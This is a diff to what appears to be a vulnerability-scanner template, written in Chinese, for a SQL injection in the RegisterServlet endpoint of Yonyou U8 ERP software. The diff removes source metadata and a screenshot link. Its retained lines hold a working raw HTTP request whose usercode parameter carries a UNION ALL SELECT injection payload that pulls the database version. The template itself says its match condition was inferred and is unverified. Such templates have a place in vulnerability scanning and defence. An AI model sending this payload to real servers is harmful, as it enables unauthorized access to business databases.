@@ -3,13 +3,8 @@ info:
   name: 用友U8 nc.bs.sm.login2.RegisterServlet SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tpepzwikx6dkgcq5
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tpepzwikx6dkgcq5
 http:
 - raw:
   - 'GET /servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL--%20Jptd HTTP/1.1
@@ -22,9 +17,6 @@ http:
 
 
     Cookie: JSESSIONID=D523370AE42E1D2363160250C914E62A.server
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717058972589-91585feb-1364-4130-a7fe-3fc1a3de2492.png)
 
 
     ## 修复建议
